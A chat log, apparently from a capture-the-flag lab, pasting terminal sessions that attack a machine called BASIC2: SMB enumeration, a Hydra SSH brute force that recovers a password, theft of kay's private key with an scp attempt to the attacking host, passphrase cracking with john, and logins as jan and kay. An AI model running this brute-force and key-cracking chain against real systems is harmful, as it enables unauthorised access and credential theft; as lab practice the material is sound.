@@ -1,0 +1,501 @@
+[10/6/2026 6:11 PM] Felorez: hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.114.184.69 -t 50
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-06 13:04:17
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 50 tasks per 1 server, overall 50 tasks, 14344398 login tries (l:1/p:14344398), ~286888 tries per task
+[DATA] attacking ssh://10.114.184.69:22/
+[STATUS] 295.00 tries/min, 295 tries in 00:01h, 14344130 to do in 810:25h, 23 active
+[STATUS] 183.33 tries/min, 550 tries in 00:03h, 14343876 to do in 1303:60h, 22 active
+[22][ssh] host: 10.114.184.69   login: jan   password: armando
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 15 final worker threads did not complete until end.
+[ERROR] 15 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-06 13:09:15
+[10/6/2026 6:13 PM] Felorez: аккаунт жертвы - 10.114.184.69
+[10/6/2026 6:43 PM] Felorez: root@ip-10-114-148-220:~# cd home 
+bash: cd: home: No such file or directory
+root@ip-10-114-148-220:~# ssh2john id_rsa > rsa 
+root@ip-10-114-148-220:~# john rsa -w=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+No password hashes loaded (see FAQ)
+root@ip-10-114-148-220:~# ssh2john id_rsa > rsa.hash
+root@ip-10-114-148-220:~# john rsa.hash -w=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+No password hashes loaded (see FAQ)
+root@ip-10-114-148-220:~# john --wordlist=/usr/share/wordlists/rockyou.txt rsa.hash
+Using default input encoding: UTF-8
+No password hashes loaded (see FAQ)
+root@ip-10-114-148-220:~# ls -lh rsa.hash
+-rw-r--r-- 1 root root 46 Oct  6 13:30 rsa.hash
+root@ip-10-114-148-220:~# head -c 300 rsa.hash  
+[Errno 2] No such file or directory: 'id_rsa'
+root@ip-10-114-148-220:~# ssh2john id_rsa > rsa     
+root@ip-10-114-148-220:~# john rsa -w=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
+Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+beeswax          (id_rsa)     
+1g 0:00:00:00 DONE (2026-10-06 13:34) 9.091g/s 752145p/s 752145c/s 752145C/s behlat..bball40
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+root@ip-10-114-148-220:~# ssh kay@10.114.184.69 -i id_rsa
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for 'id_rsa' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "id_rsa": bad permissions
+kay@10.114.184.69's password: 
+Permission denied, please try again.
+kay@10.114.184.69's password: 
+Permission denied, please try again.
+kay@10.114.184.69's password: 
+kay@10.114.184.69: Permission denied (publickey,password).
+root@ip-10-114-148-220:~# chmod 600 id_rsa
+root@ip-10-114-148-220:~# ssh kay@10.114.184.69 -i id_rsa
+Enter passphrase for key 'id_rsa': 
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Tue 06 Oct 2026 09:41:46 AM EDT
+
+  System load:  0.07               Processes:             117
+  Usage of /:   49.9% of 13.62GB   Users logged in:       1
+  Memory usage: 59%                IPv4 address for ens5: 10.114.184.69
+  Swap usage:   0%
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Infra to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+
+Last login: Sun Jun 22 13:40:04 2025 from 10.23.8.228
+kay@ip-10-114-184-69:~$ cat pass.bk
+cat: pass.bk: No such file or directory
+kay@ip-10-114-184-69:~$ ls
+pass.bak
+kay@ip-10-114-184-69:~$ cat pass.bak
+heresareallystrongpasswordthatfollowsthepasswordpolicy$$
+[10/6/2026 6:43 PM] Felorez: root@ip-10-114-148-220:~# enum4linux -a 10.114.184.69 
+ENUM4LINUX - next generation (v1.3.10)
+
+usage: enum4linux-ng.py [-h] [-A] [-As] [-U] [-G] [-Gm] [-S] [-C] [-P] [-O]
+                        [-L] [-I] [-R [BULK_SIZE]] [-N] [-w DOMAIN] [-u USER]
+                        [-p PW | -K TICKET_FILE | -H NTHASH] [--local-auth]
+                        [-d] [-k USERS] [-r RANGES] [-s SHARES_FILE]
+                        [-t TIMEOUT] [-v] [--keep]
+                        [-oJ OUT_JSON_FILE | -oY OUT_YAML_FILE | -oA OUT_FILE]
+                        host
+enum4linux-ng.py: error: unrecognized arguments: -a
+root@ip-10-114-148-220:~# enum4linux -A 10.114.184.69
+ENUM4LINUX - next generation (v1.3.10)
+
+ ==========================
+|    Target Information    |
+ ==========================
+[*] Target ........... 10.114.184.69
+[*] Username ......... ''
+[*] Random Username .. 'fnmbclxu'
+[*] Password ......... ''
+[*] Timeout .......... 10 second(s)
+
+ ======================================
+|    Listener Scan on 10.114.184.69    |
+ ======================================
+[*] Checking LDAP
+[-] Could not connect to LDAP on 389/tcp: connection refused
+[*] Checking LDAPS
+[-] Could not connect to LDAPS on 636/tcp: connection refused
+[*] Checking SMB
+[+] SMB is accessible on 445/tcp
+[*] Checking SMB over NetBIOS
+[+] SMB over NetBIOS is accessible on 139/tcp
+
+ ============================================================
+|    NetBIOS Names and Workgroup/Domain for 10.114.184.69    |
+ ============================================================
+[+] Got domain/workgroup name: WORKGROUP
+[+] Full NetBIOS names information:
+- BASIC2          <00> -         B <ACTIVE>  Workstation Service
+- BASIC2          <03> -         B <ACTIVE>  Messenger Service
+- BASIC2          <20> -         B <ACTIVE>  File Server Service
+- ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
+- WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
+- WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
+- WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
+- MAC Address = 00-00-00-00-00-00
+
+ ==========================================
+|    SMB Dialect Check on 10.114.184.69    |
+ ==========================================
+[*] Trying on 445/tcp
+[+] Supported dialects and settings:
+Supported dialects:
+  SMB 1.0: false
+  SMB 2.0.2: true
+  SMB 2.1: true
+  SMB 3.0: true
+  SMB 3.1.1: true
+Preferred dialect: SMB 3.0
+SMB1 only: false
+SMB signing required: false
+
+ ============================================================
+|    Domain Information via SMB session for 10.114.184.69    |
+ ============================================================
+[*] Enumerating via unauthenticated SMB session on 445/tcp
+[+] Found domain information via SMB
+NetBIOS computer name: BASIC2
+NetBIOS domain name: ''
+DNS domain: eu-central-1.compute.internal
+FQDN: ip-10-114-184-69.eu-central-1.compute.internal
+Derived membership: workgroup member
+Derived domain: unknown
+
+ ==========================================
+|    RPC Session Check on 10.114.184.69    |
+ ==========================================
+[*] Check for anonymous access (null session)
+[+] Server allows authentication via username '' and password ''
+[*] Check for guest access
+[+] Server allows authentication via username 'fnmbclxu' and password ''
+[H] Rerunning enumeration with user 'fnmbclxu' might give more results
+
+ ====================================================
+|    Domain Information via RPC for 10.114.184.69    |
+ ====================================================
+[+] Domain: WORKGROUP
+[+] Domain SID: NULL SID
+[+] Membership: workgroup member
+
+ ================================================
+|    OS Information via RPC for 10.114.184.69    |
+ ================================================
+[*] Enumerating via unauthenticated SMB session on 445/tcp
+[+] Found OS information via SMB
+[*] Enumerating via 'srvinfo'
+[+] Found OS information via 'srvinfo'
+[+] After merging OS information we have the following result:
+OS: Linux/Unix (Samba Server 4.15.13-Ubuntu)
+OS version: '6.1'
+OS release: ''
+OS build: '0'
+Native OS: not supported
+Native LAN manager: not supported
+Platform id: '500'
+Server type: '0x809a03'
+Server type string: Wk Sv PrQ Unx NT SNT Samba Server 4.15.13-Ubuntu
+
+ ======================================
+|    Users via RPC on 10.114.184.69    |
+ ======================================
+[*] Enumerating users via 'querydispinfo'
+[+] Found 0 user(s) via 'querydispinfo'
+[*] Enumerating users via 'enumdomusers'
+[+] Found 0 user(s) via 'enumdomusers'
+
+ =======================================
+|    Groups via RPC on 10.114.184.69    |
+ =======================================
+[*] Enumerating local groups
+[+] Found 0 group(s) via 'enumalsgroups domain'
+[*] Enumerating builtin groups
+[+] Found 0 group(s) via 'enumalsgroups builtin'
+[*] Enumerating domain groups
+[+] Found 0 group(s) via 'enumdomgroups'
+
+ =======================================
+|    Shares via RPC on 10.114.184.69    |
+ =======================================
+[*] Enumerating shares
+[+] Found 2 share(s):
+Anonymous:
+  comment: ''
+  type: Disk
+IPC$:
+  comment: IPC Service (Samba Server 4.15.13-Ubuntu)
+  type: IPC
+[*] Testing share Anonymous
+[+] Mapping: OK, Listing: OK
+[*] Testing share IPC$
+[-] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND
+
+ ==========================================
+|    Policies via RPC for 10.114.184.69    |
+ ==========================================
+[*] Trying port 445/tcp
+[+] Found policy:
+Domain password information:
+  Password history length: None
+  Minimum password length: 5
+  Minimum password age: none
+  Maximum password age: 49710 days (136 years) 6 hours 21 minutes
+  Password properties:
+  - DOMAIN_PASSWORD_COMPLEX: false
+  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
+  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
+  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
+  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
+  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
+Domain lockout information:
+  Lockout observation window: 30 minutes
+  Lockout duration: 30 minutes
+  Lockout threshold: None
+Domain logoff information:
+  Force logoff time: 49710 days (136 years) 6 hours 21 minutes
+
+ ==========================================
+|    Printers via RPC for 10.114.184.69    |
+ ==========================================
+[+] No printers returned (this is not an error)
+
+Completed after 1.42 seconds
+root@ip-10-114-148-220:~# smbclient -L 10.114.184.69
+Password for [WORKGROUP\root]:
+session setup failed: NT_STATUS_CONNECTION_DISCONNECTED
+root@ip-10-114-148-220:~# smbclient -L 10.114.184.69 -N
+
+  Sharename       Type      Comment
+  ---------       ----      -------
+  Anonymous       Disk      
+  IPC$            IPC       IPC Service (Samba Server 4.15.13-Ubuntu)
+SMB1 disabled -- no workgroup available
+root@ip-10-114-148-220:~# smbclient //10.114.184.69/Anonymous -N
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Thu Apr 19 17:31:20 2018
+  ..                                  D        0  Thu Apr 19 17:13:06 2018
+  staff.txt                           N      173  Thu Apr 19 17:29:55 2018
+
+    14282840 blocks of size 1024. 6245800 blocks available
+smb: \> cat staff.txt
+cat: command not found
+smb: \> get staff.txt
+getting file \staff.txt of size 173 as staff.txt (15.4 KiloBytes/sec) (average 15.4 KiloBytes/sec)
+smb: \> cat staff.txt
+cat: command not found
+smb: \> ^C
+root@ip-10-114-148-220:~# cat staff.txt
+Announcement to staff:
+
+PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
+this is how mistakes happen. (This means you too, Jan!)
+
+-Kay
+root@ip-10-114-148-220:~# hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.114.184.69 -t 50
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+[10/6/2026 6:43 PM] Felorez: 
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-06 13:04:17
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 50 tasks per 1 server, overall 50 tasks, 14344398 login tries (l:1/p:14344398), ~286888 tries per task
+[DATA] attacking ssh://10.114.184.69:22/
+[STATUS] 295.00 tries/min, 295 tries in 00:01h, 14344130 to do in 810:25h, 23 active
+[STATUS] 183.33 tries/min, 550 tries in 00:03h, 14343876 to do in 1303:60h, 22 active
+[22][ssh] host: 10.114.184.69   login: jan   password: armando
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 15 final worker threads did not complete until end.
+[ERROR] 15 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-06 13:09:15
+root@ip-10-114-148-220:~# ssh jan@10.114.184.69
+The authenticity of host '10.114.184.69 (10.114.184.69)' can't be established.
+ED25519 key fingerprint is SHA256:YmAkF4FG5HDJfcd+8gKUMR0Talo8+fwPHVRHQzDT4zc.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.114.184.69' (ED25519) to the list of known hosts.
+jan@10.114.184.69's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-139-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Tue 06 Oct 2026 09:12:55 AM EDT
+
+  System load:  0.01               Processes:             113
+  Usage of /:   49.8% of 13.62GB   Users logged in:       0
+  Memory usage: 61%                IPv4 address for ens5: 10.114.184.69
+  Swap usage:   0%
+
+Expanded Security Maintenance for Infrastructure is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Infra to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Your Hardware Enablement Stack (HWE) is supported until April 2025.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Mon Apr 23 15:55:45 2018 from 192.168.56.102
+jan@ip-10-114-184-69:~$ ls -la
+total 12
+drwxr-xr-x 2 root root 4096 Apr 23  2018 .
+drwxr-xr-x 5 root root 4096 Oct  6 08:52 ..
+-rw------- 1 root jan    47 Apr 23  2018 .lesshst
+jan@ip-10-114-184-69:~$ cd /home
+jan@ip-10-114-184-69:/home$ ls
+jan  kay  ubuntu
+jan@ip-10-114-184-69:/home$ kay
+
+Command 'kay' not found, did you mean:
+
+  command 'kak' from snap kakoune (v2023.08.05)
+  command 'key' from deb donkey (1.2.0-4)
+  command 'kak' from deb kakoune (2019.07.01-1build1)
+  command 'say' from deb gnustep-gui-runtime (0.27.0-5build2)
+
+See 'snap info <snapname>' for additional versions.
+
+jan@ip-10-114-184-69:/home$ cd kay
+jan@ip-10-114-184-69:/home/kay$ ls
+pass.bak
+jan@ip-10-114-184-69:/home/kay$ ls -la
+total 48
+drwxr-xr-x 5 kay  kay  4096 Apr 23  2018 .
+drwxr-xr-x 5 root root 4096 Oct  6 08:52 ..
+-rw------- 1 kay  kay   789 Jun 22  2025 .bash_history
+-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
+-rw-r--r-- 1 kay  kay  3771 Apr 17  2018 .bashrc
+drwx------ 2 kay  kay  4096 Apr 17  2018 .cache
+-rw------- 1 root kay   119 Apr 23  2018 .lesshst
+drwxrwxr-x 2 kay  kay  4096 Apr 23  2018 .nano
+-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
+-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
+drwxr-xr-x 2 kay  kay  4096 Apr 23  2018 .ssh
+-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
+-rw------- 1 root kay   538 Apr 23  2018 .viminfo
+jan@ip-10-114-184-69:/home/kay$ cd .ssh
+jan@ip-10-114-184-69:/home/kay/.ssh$ ls
+authorized_keys  id_rsa  id_rsa.pub
+jan@ip-10-114-184-69:/home/kay/.ssh$ scp id_rsa root@10.114.148.220:/home/ -N
+-N: No such file or directory
+jan@ip-10-114-184-69:/home/kay/.ssh$ scp id_rsa root@10.114.148.220:/home/
+Could not create directory '/home/jan/.ssh'.
+The authenticity of host '10.114.148.220 (10.114.148.220)' can't be established.
+ECDSA key fingerprint is SHA256:rfH0FSohESEbcS++4z6cSETCbcwkJJOS9wPmhEaAneg.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Failed to add the host to the list of known hosts (/home/jan/.ssh/known_hosts).
+root@10.114.148.220's password: 
+Permission denied, please try again.
+root@10.114.148.220's password: 
+Connection closed by 10.114.148.220 port 22
+lost connection
+jan@ip-10-114-184-69:/home/kay/.ssh$ scp id_rsa root@10.114.148.220:/home/
+Could not create directory '/home/jan/.ssh'.
+The authenticity of host '10.114.148.220 (10.114.148.220)' can't be established.
+ECDSA key fingerprint is SHA256:rfH0FSohESEbcS++4z6cSETCbcwkJJOS9wPmhEaAneg.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Failed to add the host to the list of known hosts (/home/jan/.ssh/known_hosts).
+root@10.114.148.220's password: 
+Permission denied, please try again.
+root@10.114.148.220's password: 
+Permission denied, please try again.
+root@10.114.148.220's password: 
+root@10.114.148.220: Permission denied (publickey,password).
+lost connection
+jan@ip-10-114-184-69:/home/kay/.ssh$ cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75
+[10/6/2026 6:43 PM] Felorez: 
+
+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
+-----END RSA PRIVATE KEY-----
+jan@ip-10-114-184-69:/home/kay/.ssh$ ^C
+jan@ip-10-114-184-69:/home/kay/.ssh$ cd kay
+-bash: cd: kay: No such file or directory
+jan@ip-10-114-184-69:/home/kay/.ssh$ cd ..
+jan@ip-10-114-184-69:/home/kay$ ls
+pass.bak
+jan@ip-10-114-184-69:/home/kay$ cat pass.bk
+cat: pass.bk: No such file or directory
+jan@ip-10-114-184-69:/home/kay$ ssh kay@10.10.50.222
